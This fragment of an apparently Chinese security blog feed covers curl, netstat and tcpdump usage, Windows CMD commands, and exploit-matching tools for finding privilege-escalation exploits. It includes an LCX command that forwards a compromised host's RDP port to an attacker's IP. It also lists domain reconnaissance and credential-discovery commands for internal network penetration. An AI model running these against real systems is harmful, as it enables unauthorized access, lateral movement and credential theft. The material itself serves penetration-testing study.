发送HEAD请求</li></ul></li></ul><ol start="6"><li><p>提交表单</p><ul><li><p>GET方式 curl <a href="https://www.example.com/?data=abc123" target="_blank" rel="noopener">https://www.example.com/?data=abc123</a></p></li><li><p>POST方式 curl -X POST <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a> –data /-d “data=abc123”</p><p>也可以读取本地文件数据发送POST请求</p><p>curl -d ‘@localfile.txt’ <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a></p></li></ul></li><li><p>文件上传</p><ul><li><p>假设网站上传文件的代码如下：</p><pre><code class="hljs php+HTML">&lt;form method&#x3D;&quot;POST&quot; enctype&#x3D;&#39;multipart&#x2F;form-data&#39; action&#x3D;&quot;upload.cgi&quot;&gt;    &lt;input type&#x3D;file name&#x3D;upload&gt;    &lt;input type&#x3D;submit name&#x3D;press value&#x3D;&quot;OK&quot;&gt;  &lt;&#x2F;form&gt;</code></pre><p>上传本地文件localfile的命令如下：</p><p>curl –form upload=’@localfile’ –form press=OK [URL]</p></li><li><p>上传二进制文件</p><ul><li><p>curl -F ‘file=@localfile’ <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a></p></li><li><p>设置MIME类型<br>curl -F ‘file=@localfile;type=image/png’ <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a></p></li><li><p>设置上传后的文件名</p><p>curl -F ‘file=@localfile;filename=new.png’ <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a></p></li></ul></li></ul></li><li><p>修改HTTP请求头 -H / –header</p><p>如修改referer</p><p>curl -H ‘your_referer’ <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a></p><p>UA、cookie以及其它头部内容的修改也可以通过-H / –header参数进行</p></li><li><p>设置User-Agent</p><p>默认UA为 curl/version</p><ul><li><p>使用-A参数</p><p>curl -A ‘your_ua’ <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a></p></li><li><p>使用–user-agent参数</p><p>curl –user-agent ‘your_ua’ <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a></p></li></ul></li><li><p>设置Referer</p><ul><li><p>使用-e参数</p><p>curl -e ‘your_referer’ <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a></p></li><li><p>使用–referer参数</p><p>curl –referer your_referer <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a></p></li></ul></li><li><p>设置cookie</p><ul><li><p>curl –cookie “name=xxx” <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a></p></li><li><p>保存cookie文件<br>curl -c cookies <a href="http://example.com" target="_blank" rel="noopener">http://example.com</a></p></li><li><p>发送cookie文件</p><p>curl -b cookies <a href="http://example.com" target="_blank" rel="noopener">http://example.com</a></p></li></ul></li><li><p>设置代理</p><p>curl -x your_proxy <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a></p></li><li><p>HTTP认证</p><ul><li><p>curl –user / -u name:pass <a href="http://example.com" target="_blank" rel="noopener">http://example.com</a></p></li><li><p>curl <a href="http://name:pass@example.com" target="_blank" rel="noopener">http://name:pass@example.com</a></p></li></ul></li><li><p>跳过SSL证书数检查</p><p>curl -k <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a></p></li><li><p>跟随服务器重定向（默认不跟随）</p><p>curl -L <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a></p></li><li><p>显示信息</p><ul><li><p>-s 不输出错误信息和进度信息</p></li><li><p>-S 只输出错误信息和进度信息</p></li><li><p>-v 输出通信过程</p></li><li><p>获取更详细的信息 curl –trace 1.txt <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a></p><p>在保存的文件中可以看到传输的十六进制数据</p></li></ul></li></ol><h2 id="02-LCX"><a href="#02-LCX" class="headerlink" title="02 LCX"></a>02 LCX</h2><p>端口转发（需要本机有公网IP）：</p><ul><li>本机执行 lcx.exe -listen 9999 3389</li><li>肉鸡执行 lcx.exe -slave 本机公网IP 9999 肉鸡IP 3389</li></ul><p>结果：将肉鸡的3389端口转发到本机的9999端口</p><h1 id="03-netstat"><a href="#03-netstat" class="headerlink" title="03 netstat"></a>03 netstat</h1><p>参考：codesheep</p><p>netstat用于获取网络连接信息</p><ol><li>参数<ul><li>-n 使用IP地址表示主机</li><li>-a 显示结果中包含的socket</li><li>-t 仅显示TCP连接</li><li>-r 显示路由信息</li><li>-i 显示网卡接口数据流量</li><li>-c 每隔一秒输出一次</li><li>-o 显示socket定时器的信息</li><li>-p 显示socket所属的进程的PID和名字</li><li>-s 打印统计信息</li></ul></li><li>常用组合<ul><li>只列出TCP或UDP连接 netstat -at/-au</li><li>列出监听中的连接 netstat -tnl</li><li>获取进程名、进程号及用户ID netstat -nlpt</li><li>持续输出 netstat -ct</li><li>打印active状态的连接 netstat -atpn | grep ESTA</li><li>查看服务是否运行 netstat -aple | grep ntp</li></ul></li></ol><h2 id="04-tcpdump"><a href="#04-tcpdump" class="headerlink" title="04 tcpdump"></a>04 tcpdump</h2><p>参考：codesheep</p><ol><li>参数<ul><li>-n 使用IP地址表示主机，使用数字表示端口</li><li>-i 指定要监听的端口，如果为”-i any“则表示所有网卡数据包</li><li>-v 输出TTL等更详细的信息</li><li>-t 不打印时间戳</li><li>-e 显示以太网帧头部信息</li><li>-c 仅抓取指定数量的数据包</li><li>-x 按照十六进制显示内容</li><li>-X 输出十六进制和对应的ASCII字符</li><li>-S 设置抓包长度</li><li>-W 将结果定向输出到某个文件，一般是pcap后缀</li><li>-r 从pcap文件读取数据包并显示</li><li>post 指定端口</li></ul></li><li>常用组合<ul><li>指定捕获包的协议类型 tcpdump -i eth0 arp</li><li>捕获DNS请求和响应 tcpdump -i eth0 -s0 port 53</li><li>匹配HTTP请求头 tcpdump -s 0 -v -n -l |egrep -i “POST /|GET /|Host:”</li><li>获取特点目的IP+PORT的数据包 tcpdump -i eth0 dst address and port 22</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CMD常用命令</title>
    <link href="/CMD%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/CMD%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>用惯Linux就忘掉CMD了</p><a id="more"></a><h1 id="CMD常用命令"><a href="#CMD常用命令" class="headerlink" title="CMD常用命令"></a>CMD常用命令</h1><p><a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/windows-commands" target="_blank" rel="noopener">命令文档</a></p><h2 id="00-系统命令"><a href="#00-系统命令" class="headerlink" title="00 系统命令"></a>00 系统命令</h2><ul><li>whoami 查看当前用户</li><li>hostname 显示主机名</li><li>ipconfig 查看网卡信息</li><li>help 查看帮助</li><li>systeminfo 查看系统信息</li><li>ver 显示Windows版本</li><li>date 显示或设置日期</li><li>time 显示或设置时间</li><li>cls 清屏</li><li>shutdown /s 关机</li><li>shutdown /s /t n 定时关机（时间n秒）</li><li>shutdown /a 取消关机</li><li>shutdown /r 重启</li><li>shutdown /l 注销</li><li>shutdown /h /f 休眠</li><li>win+E 打开文件管理器</li><li>win+D 显示桌面</li><li>win+L 锁定</li></ul><h2 id="01-目录与文件操作"><a href="#01-目录与文件操作" class="headerlink" title="01 目录与文件操作"></a>01 目录与文件操作</h2><ul><li>d: 进入d盘</li><li>cd 切换目录 / 显示当前目录</li><li>cd .. 返回上级目录</li><li>cd / 返回根目录</li><li>dir 查看当前目录的内容</li><li>md / mkdir 创建目录</li><li>rd / rmdir 删除目录</li><li>type 显示文本文件内容</li><li>ren 重命名文件</li><li>del 删除文件</li><li>find 查找文件</li><li>copy 复制文件</li><li>move 移动文件</li></ul><h2 id="02-进程操作"><a href="#02-进程操作" class="headerlink" title="02 进程操作"></a>02 进程操作</h2><ul><li>tasklist 查看进程</li><li>tasklist /svc 查看进程对应的服务</li><li>taskkill 杀死进程</li><li>findstr 查找字符串，类似grep，可以结合管道|使用</li></ul><h2 id="03-net命令"><a href="#03-net命令" class="headerlink" title="03 net命令"></a>03 net命令</h2><ul><li>net user 查看用户信息</li><li>net user 用户名 密码 /add 添加用户</li><li>net user 用户名 /delete 删除用户</li><li>net localgroup 组名 用户名 /add 将用户添加到组中</li><li>net 用户名 密码 更改用户密码</li><li>net 密码 更改登录密码</li><li>net localgroup 查看本地组</li><li>net start 查看开启的服务</li><li>net start 服务名 启动服务</li><li>net pause 服务名 暂停服务</li><li>net continue 服务名 继续服务</li><li>net stop 服务名 关闭服务</li><li>net config 查看系统的网络设置</li><li>net share 查看开启的共享</li></ul><h2 id="04-其他网络命令"><a href="#04-其他网络命令" class="headerlink" title="04 其他网络命令"></a>04 其他网络命令</h2><ul><li>arp 查看arp缓存</li><li>netstat 查看端口信息</li><li>ping </li><li>tracert 查看与目标直接的路由路径</li><li>telnet 远程登录 </li></ul><h2 id="05-内网渗透常用探测命令"><a href="#05-内网渗透常用探测命令" class="headerlink" title="05 内网渗透常用探测命令"></a>05 内网渗透常用探测命令</h2><pre><code class="hljs pgsql">ipconfig /<span class="hljs-keyword">all</span>        <span class="hljs-comment">------ 查询本机IP段，所在域等</span>net <span class="hljs-keyword">user</span>           <span class="hljs-comment">------ 本机用户列表</span>net localgroup administrators      <span class="hljs-comment">------ 本机管理员[通常含有域用户]</span>net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span>             <span class="hljs-comment">------ 查询域用户</span>net ``<span class="hljs-keyword">group</span>` `/<span class="hljs-keyword">domain</span>            <span class="hljs-comment">------ 查询域里面的工作组</span>net ``<span class="hljs-keyword">group</span>` `"domain admins"` `/<span class="hljs-keyword">domain</span>    <span class="hljs-comment">------ 查询域管理员用户组</span>net localgroup administrators /<span class="hljs-keyword">domain</span>  <span class="hljs-comment">------ 登录本机的域管理员</span>net localgroup administrators workgroup\user001 /<span class="hljs-keyword">add</span>  <span class="hljs-comment">------域用户添加到本机</span>net ``<span class="hljs-keyword">group</span>` `"domain controllers"` `/<span class="hljs-keyword">domain</span>    <span class="hljs-comment">------ 查看域控制器(如果有多台)</span>net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span>          <span class="hljs-comment">------ 判断主域，主域服务器都做时间服务器</span>net config workstation       <span class="hljs-comment">------ 当前登录域</span>net <span class="hljs-keyword">session</span>            <span class="hljs-comment">------ 查看当前会话</span>net use \\ip\ipc$ pawword /<span class="hljs-keyword">user</span>:username   <span class="hljs-comment">------ 建立IPC会话[空连接-***]</span>net <span class="hljs-keyword">share</span>             <span class="hljs-comment">------ 查看SMB指向的路径[即共享]</span>net <span class="hljs-keyword">view</span>              <span class="hljs-comment">------ 查询同一域内机器列表</span>net <span class="hljs-keyword">view</span> \\ip           <span class="hljs-comment">------ 查询某IP共享</span>net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span>          <span class="hljs-comment">------ 查询域列表</span>net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span>:domainname    <span class="hljs-comment">------ 查看workgroup域中计算机列表</span>net <span class="hljs-keyword">start</span>             <span class="hljs-comment">------ 查看当前运行的服务</span>net accounts            <span class="hljs-comment">------ 查看本地密码策略</span>net accounts /<span class="hljs-keyword">domain</span>        <span class="hljs-comment">------ 查看域密码策略</span>nbtstat –A ip           <span class="hljs-comment">------netbios 查询</span>netstat –an/ano/anb        <span class="hljs-comment">------ 网络连接查询</span>route print            <span class="hljs-comment">------ 路由表tasklist /V            ----- 查看进程[显示对应用户]</span>tasklist /S ip /U <span class="hljs-keyword">domain</span>\username /P /V       <span class="hljs-comment">----- 查看远程计算机进程列表</span>qprocess *             <span class="hljs-comment">----- 类似tasklist</span>qprocess /<span class="hljs-keyword">SERVER</span>:IP        <span class="hljs-comment">----- 远程查看计算机进程列表</span>nslookup –qt-MX Yahoo.com     <span class="hljs-comment">----- 查看邮件服务器</span>whoami /<span class="hljs-keyword">all</span>            <span class="hljs-comment">----- 查询当前用户权限等</span><span class="hljs-keyword">set</span>`                `<span class="hljs-comment">----- 查看系统环境变量</span>systeminfo             <span class="hljs-comment">----- 查看系统信息</span>qwinsta              <span class="hljs-comment">----- 查看登录情况</span>qwinsta /<span class="hljs-keyword">SERVER</span>:IP         <span class="hljs-comment">----- 查看远程登录情况</span>fsutil fsinfo drives        <span class="hljs-comment">----- 查看所有盘符</span>gpupdate /force          <span class="hljs-comment">----- 更新域策略cmdkey /l             ----- 看是否保存了登陆凭证。（攻击者会先查看管理员是否保留了登陆凭证，方便后续的凭证抓取。） echo %logonserver%         ----- 查看登陆域</span></code></pre><h2 id="06-一些系统常量"><a href="#06-一些系统常量" class="headerlink" title="06 一些系统常量"></a>06 一些系统常量</h2><p>%HOMEDRIVE% =C:\ 当前启动的系统的所在分区</p><p>%SystemRoot% =C:\WINDOWS 当前启动的系统的所在目录</p><p>%windir% = %SystemRoot% = C:\WINDOWS 当前启动的系统的所在目录</p><p>%USERPROFILE% =C:\Documents and Settings\用户名 当前用户数据变量</p><p>%HOMEPATH% =C:\Documents and Settings\用户名 当前用户环境变量<br>%temp% = %USERPROFILE%\Local Settings\Temp等同于<br>C:\Documents and Settings\用户名\Local Settings\Temp</p><p>当前用户TEMP缓存变量</p><p>%appData%=win7下<br>C:\Users\用户名\AppData\Roaming</p><p>XP-2003下<br>C:\Documents and Settings\用户名\Application Data</p><p>%appData%表示当前用户路径中的应用程序数据所在的路径</p><p>2013.4.28搜索到全部内容，备份到下面</p><p>%ALLUSERSPROFILE% ： 列出所有用户Profile文件位置。<br>%APPDATA% : 列出应用程序数据的默认存放位置。<br>%CD% : 列出当前目录。<br>%CLIENTNAME% : 列出联接到终端服务会话时客户端的NETBiOS名。<br>%CMDCMDLINE% : 列出启动当前cmd.exe所使用的命令行。<br>%CMDEXTVERSION% : 命令出当前命令处理程序扩展版本号。<br>%CommonProgramFiles% : 列出了常用文件的文件夹路径。<br>%COMPUTERNAME% : 列出了计算机名。<br>%COMSPEC% : 列出了可执行命令外壳（命令处理程序）的路径。<br>%DATE% : 列出当前日期。<br>%ERRORLEVEL% : 列出了最近使用的命令的错误代码。<br>%HOMEDRIVE% : 列出与用户主目录所在的驱动器盘符。<br>%HOMEPATH% : 列出用户主目录的完整路径。<br>%HOMESHARE% : 列出用户共享主目录的网络路径。<br>%LOGONSEVER% : 列出有效的当前登录会话的域名控制器名。<br>%NUMBER_OF_PROCESSORS% : 列出了计算机安装的处理器数。<br>%OS% : 列出操作系统的名字。(Windows XP 和 Windows 2000 列为 Windows_NT.)<br>%Path% : 列出了可执行文件的搜索路径。<br>%PATHEXT% : 列出操作系统认为可被执行的文件扩展名。<br>%PROCESSOR_ARCHITECTURE% : 列出了处理器的芯片架构。<br>%PROCESSOR_IDENTFIER% : 列出了处理器的描述。<br>%PROCESSOR_LEVEL% : 列出了计算机的处理器的型号。<br>%PROCESSOR_REVISION% : 列出了处理器的修订号。<br>%ProgramFiles% : 列出了Program Files文件夹的路径。<br>%PROMPT% : 列出了当前命令解释器的命令提示设置。<br>%RANDOM% : 列出界于0 和 32767之间的随机十进制数。<br>%SESSIONNAME% : 列出连接到终端服务会话时的连接和会话名。<br>%SYSTEMDRIVE% : 列出了Windows启动目录所在驱动器。<br>%SYSTEMROOT% : 列出了Windows启动目录的位置。<br>%TEMP% and %TMP% : 列出了当前登录的用户可用应用程序的默认临时目录。<br>%TIME% : 列出当前时间。<br>%USERDOMAIN% : 列出了包含用户帐号的域的名字。<br>%USERNAME% : 列出当前登录的用户的名字。<br>%USERPROFILE% : 列出当前用户Profile文件位置。<br>%WINDIR% : 列出操作系统目录的位置。</p><p>变量 类型 描述<br>%ALLUSERSPROFILE% 本地 返回“所有用户”配置文件的位置。<br>%APPDATA% 本地 返回默认情况下应用程序存储数据的位置。<br>%CD% 本地 返回当前目录字符串。<br>%CMDCMDLINE% 本地 返回用来启动当前的 Cmd.exe 的准确命令行。<br>%CMDEXTVERSION% 系统 返回当前的“命令处理程序扩展”的版本号。<br>%COMPUTERNAME% 系统 返回计算机的名称。<br>%COMSPEC% 系统 返回命令行解释器可执行程序的准确路径。<br>%DATE% 系统 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。<br>%ERRORLEVEL% 系统 返回上一条命令的错误代码。通常用非零值表示错误。<br>%HOMEDRIVE% 系统 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。<br>%HOMEPATH% 系统 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。<br>%HOMESHARE% 系统 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。<br>%LOGONSERVER% 本地 返回验证当前登录会话的域控制器的名称。<br>%NUMBER_OF_PROCESSORS% 系统 指定安装在计算机上的处理器的数目。<br>%OS% 系统 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。<br>%PATH% 系统 指定可执行文件的搜索路径。<br>%PATHEXT% 系统 返回操作系统认为可执行的文件扩展名的列表。<br>%PROCESSOR_ARCHITECTURE% 系统 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。<br>%PROCESSOR_IDENTFIER% 系统 返回处理器说明。<br>%PROCESSOR_LEVEL% 系统 返回计算机上安装的处理器的型号。<br>%PROCESSOR_REVISION% 系统 返回处理器的版本号。<br>%PROMPT% 本地 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。<br>%RANDOM% 系统 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。<br>%SYSTEMDRIVE% 系统 返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。<br>%SYSTEMROOT% 系统 返回 Windows server operating system 根目录的位置。<br>%TEMP% 和 %TMP% 系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。<br>%TIME% 系统 返回当前时间。使用与 time /t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。<br>%USERDOMAIN% 本地 返回包含用户帐户的域的名称。<br>%USERNAME% 本地 返回当前登录的用户的名称。<br>%USERPROFILE% 本地 返回当前用户的配置文件的位置。<br>%WINDIR% 系统 返回操作系统目录的位置。</p><p>%allusersprofile%——————–所有用户的profile路径<br>%Userprofile%———————–当前用户的配置文件目录<br>%Appdata%————————–当前用户的应用程序路径<br>%commonprogramfiles%————-应用程序公用的文件路径<br>%homedrive%————————当前用户的主盘<br>%Homepath%————————当前用户的主目录<br>%programfiles%———————-应用程序的默认安装目录<br>%systemdrive%———————-系统所在的盘符<br>%systemroot%———————–系统所在的目录<br>%windir%—————————-同上，总是跟systemroot一样<br>%tmp%——————————当前用户的临时目录<br>%temp%—————————–同上临时目录</p>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下的补丁与EXP对照搜索工具 linux-exploit-suggester-2</title>
    <link href="/Linux%E4%B8%8B%E7%9A%84%E8%A1%A5%E4%B8%81%E4%B8%8EEXP%E5%AF%B9%E7%85%A7%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7-linux-exploit-suggester-2/"/>
    <url>/Linux%E4%B8%8B%E7%9A%84%E8%A1%A5%E4%B8%81%E4%B8%8EEXP%E5%AF%B9%E7%85%A7%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7-linux-exploit-suggester-2/</url>
    
    <content type="html"><![CDATA[<p>Linux下查看缺失的补丁，找到对应EXP</p><a id="more"></a><h1 id="linux-exploit-suggester-2"><a href="#linux-exploit-suggester-2" class="headerlink" title="linux-exploit-suggester-2"></a>linux-exploit-suggester-2</h1><h2 id="00-项目简介"><a href="#00-项目简介" class="headerlink" title="00 项目简介"></a>00 项目简介</h2><p><a href="https://github.com/jondonas/linux-exploit-suggester-2" target="_blank" rel="noopener">GitHub</a></p><p>可在此查看源码并查看作者介绍（以下一些内容摘自作者介绍）</p><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">Linux下的漏洞表</a></p><p><strong>关键点：</strong></p><ul><li>更多的exploits（更新至2019-3-27）</li><li>可从ExploitDB直接下载利用代码</li><li>精确匹配，更大搜索范围</li><li>输出配色，更易阅读</li><li>还有更多等你来发现</li></ul><p><em>类似的工具还有Windows-exloit-suggester，但数据库只更新到2017年</em></p><h2 id="01-使用方法"><a href="#01-使用方法" class="headerlink" title="01 使用方法"></a>01 使用方法</h2><ol><li><p>无参数启动 </p><p>脚本自己执行<strong>uname -r</strong>命令</p><p>直接返回可能的漏洞列表，但可能不准确</p><pre><code class="hljs angelscript">./linux-exploit-suggester.pl  Local Kernel: <span class="hljs-number">4.4</span><span class="hljs-number">.0</span>  Searching among <span class="hljs-number">73</span> exploits...  Possible Exploits  [<span class="hljs-number">1</span>] af_packet      CVE<span class="hljs-number">-2016</span><span class="hljs-number">-8655</span>      Source: http:<span class="hljs-comment">//www.exploit-db.com/exploits/40871</span>  [<span class="hljs-number">2</span>] dirty_cow      CVE<span class="hljs-number">-2016</span><span class="hljs-number">-5195</span>      Source: http:<span class="hljs-comment">//www.exploit-db.com/exploits/40616</span>  [<span class="hljs-number">3</span>] exploit_x      CVE<span class="hljs-number">-2018</span><span class="hljs-number">-14665</span>      Source: http:<span class="hljs-comment">//www.exploit-db.com/exploits/45697</span>  [<span class="hljs-number">4</span>] get_rekt      CVE<span class="hljs-number">-2017</span><span class="hljs-number">-16695</span>      Source: http:<span class="hljs-comment">//www.exploit-db.com/exploits/45010</span></code></pre></li><li><p>使用<strong>-k</strong>参数手动添加系统发行版本</p><pre><code class="hljs angelscript">$ ./linux-exploit-suggester.pl -k <span class="hljs-number">3</span></code></pre></li><li><p>使用<strong>-d</strong>参数打开下载菜单</p><p>可以从ExploitDB下载全部代码或选择单独的代码进行设计</p><pre><code class="hljs vim">$ ./linux-exploit-suggester.pl -d  Exploit Download  (Download <span class="hljs-keyword">al</span><span class="hljs-variable">l:</span> <span class="hljs-string">'a'</span> / Individually: <span class="hljs-string">'2,4,5'</span> / Exi<span class="hljs-variable">t:</span> ^<span class="hljs-keyword">c</span>)  Select exploits <span class="hljs-keyword">to</span> download: <span class="hljs-keyword">a</span>  Downloading http<span class="hljs-variable">s:</span>//www.exploit-db.<span class="hljs-keyword">com</span>/raw/<span class="hljs-number">40871</span> -&gt; exploit_af_packet  Downloading http<span class="hljs-variable">s:</span>//www.exploit-db.<span class="hljs-keyword">com</span>/raw/<span class="hljs-number">40616</span> -&gt; exploit_dirty_cow  Downloading http<span class="hljs-variable">s:</span>//www.exploit-db.<span class="hljs-keyword">com</span>/raw/<span class="hljs-number">45697</span> -&gt; exploit_exploit_x  Downloading http<span class="hljs-variable">s:</span>//www.exploit-db.<span class="hljs-keyword">com</span>/raw/<span class="hljs-number">45010</span> -&gt; exploit_get_rekt</code></pre></li><li><p>使用使用<strong>-h</strong>参数打开帮助菜单</p></li></ol><p>在最新版的kali Linux系统中进行了测试，可能是由于系统较新，并没有检测到可利用的漏洞</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p>可以看到可供检测的Exploits共有72个</p><h2 id="02-在线工具"><a href="#02-在线工具" class="headerlink" title="02 在线工具"></a>02 在线工具</h2><p><a href="https://detect.secwx.com/" target="_blank" rel="noopener">https://detect.secwx.com/</a></p><p><a href="http://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">http://bugs.hacking8.com/tiquan/</a></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>权限提升</tag>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows下的补丁与EXP对照搜索工具 WindowsVulnScan</title>
    <link href="/Windows%E4%B8%8B%E7%9A%84%E8%A1%A5%E4%B8%81%E4%B8%8EEXP%E5%AF%B9%E7%85%A7%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7-WindowsVulnScan/"/>
    <url>/Windows%E4%B8%8B%E7%9A%84%E8%A1%A5%E4%B8%81%E4%B8%8EEXP%E5%AF%B9%E7%85%A7%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7-WindowsVulnScan/</url>
    
    <content type="html"><![CDATA[<p>Windows下查看缺失的补丁，找到对应EXP</p><a id="more"></a><h1 id="WindowsVulnScan"><a href="#WindowsVulnScan" class="headerlink" title="WindowsVulnScan"></a>WindowsVulnScan</h1><h2 id="00-项目简介"><a href="#00-项目简介" class="headerlink" title="00 项目简介"></a>00 项目简介</h2><p><a href="https://github.com/chroblert/WindowsVulnScan" target="_blank" rel="noopener">GitHub</a></p><p>可在此查看源码并查看作者介绍（以下一些内容摘自作者介绍）</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">Windows下的漏洞与EXP对照表</a></p><p><strong>功能：</strong></p><ul><li>查找主机上具有的CVE</li><li>查找具有公开EXP的CVE</li></ul><p><strong>原理：</strong></p><ol><li><p>搜集CVE与KB的对应关系。首先在微软官网上收集CVE与KB对应的关系，然后存储进数据库中</p></li><li><p>查找特定CVE网上是否有公开的EXP</p></li><li><p>利用powershell脚本收集主机的一些系统版本与KB信息</p></li><li><p>利用系统版本与KB信息搜寻主机上具有存在公开EXP的CVE</p></li></ol><p><em>类似的工具还有Windows-exloit-suggester，但数据库只更新到2017年</em></p><h2 id="01-使用方法"><a href="#01-使用方法" class="headerlink" title="01 使用方法"></a>01 使用方法</h2><pre><code class="hljs awk"><span class="hljs-comment"># author: JC0o0l</span><span class="hljs-comment"># GitHub: https://github.com/chroblert/</span>可选参数:  -h, --help            show this help message and <span class="hljs-keyword">exit</span>  -u, --update-cve      更新CVEKB数据  -U, --update-exp      更新CVEEXP数据  -C, --check-EXP       检索具有EXP的CVE  -f FILE, --file FILE  ps1脚本运行后产生的.json文件</code></pre><p><strong>运行步骤：</strong></p><ol><li>首先运行powershell脚本<code>KBCollect.ps</code>收集一些信息</li></ol><pre><code class="hljs reasonml">.\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">KBCollect</span>.</span></span>ps1</code></pre><ol start="2"><li><p>将运行后产生的<code>KB.json</code>文件移动到<code>cve-check.py</code>所在的目录</p></li><li><p>安装一些python3模块</p></li></ol><pre><code class="hljs cmake">python3 -m pip <span class="hljs-keyword">install</span> requirements.txt</code></pre><ol start="4"><li><p>运行<code>cve-check.py -u</code>创建CVEKB数据库</p></li><li><p>运行<code>cve-check.py -U</code>更新CVEKB数据库中的<code>hasPOC</code>字段</p></li><li><p>运行<code>cve-check.py -C -f KB.json</code>查看具有公开EXP的CVE</p></li></ol><p>在Windows10中进行测试，结果如下：</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><p>可以看到系统信息、补丁与EXP</p><h2 id="02-使用中的问题"><a href="#02-使用中的问题" class="headerlink" title="02 使用中的问题"></a>02 使用中的问题</h2><ol><li><p>执行<strong>.\KBCollect.ps1</strong>时出错，系统禁止运行脚本<br><strong>解决：</strong>运行powershell时要使用管理员权限运行，否则没有权限运行KBCollect.ps1</p><p>但要注意使用管理员和非管理员权限运行时初始路径不同</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p></li><li><p>执行<strong>python3 -m pip install requirements.txt</strong>命令安装Python模块时无反应</p><p><strong>解决：</strong>直接安装需求的模块</p><p>打开requirements.txt发现只有requests2.23.0一个需求的模块，直接使用pip安装即可，<strong>pip install requests==2.23.0</strong></p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p></li><li><p>执行<strong>python .\cve-check.py -C -f .\KB.json</strong>时出现错误</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p><strong>解决：</strong>修改cve-check.py代码中的编码问题</p><p>将第275-277行修改为以下内容</p><pre><code class="hljs python"><span class="hljs-keyword">if</span> args.file:            <span class="hljs-keyword">with</span> open(args.file,<span class="hljs-string">"r"</span>,encoding=<span class="hljs-string">"utf-8-sig"</span>,errors=<span class="hljs-string">"ignore"</span>) <span class="hljs-keyword">as</span> f:                KBResult = json.load(f,strict=<span class="hljs-literal">False</span>)</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>权限提升</tag>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows提权 JuicyPotato</title>
    <link href="/Windows%E6%8F%90%E6%9D%83-JuicyPotato/"/>
    <url>/Windows%E6%8F%90%E6%9D%83-JuicyPotato/</url>
    
    <content type="html"><![CDATA[<p>多汁土豆…</p><a id="more"></a><h1 id="JuicyPotato"><a href="#JuicyPotato" class="headerlink" title="JuicyPotato"></a>JuicyPotato</h1><h2 id="00-项目地址"><a href="#00-项目地址" class="headerlink" title="00 项目地址"></a>00 项目地址</h2><p><a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener">GitHub地址</a></p><h2 id="01-简介"><a href="#01-简介" class="headerlink" title="01 简介"></a>01 简介</h2><p>Juicy Potato（多汁土豆）是一款Windows系统的本地提权工具，是在工具RottenPotatoNG（烂土豆）的基础上做了扩展，适用条件更广（with a bit of juice）</p><p>RottenPotatoNG（烂土豆）也是一个本地提权工具，针对本地用户的，不能用于域用户，相关漏洞是MS16-075，详细介绍可以看<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075" target="_blank" rel="noopener">这里</a></p><p>用途：将本地用户从低权限(SeImpersonate权限或SeAssignPrimaryToken权限)提升至NT 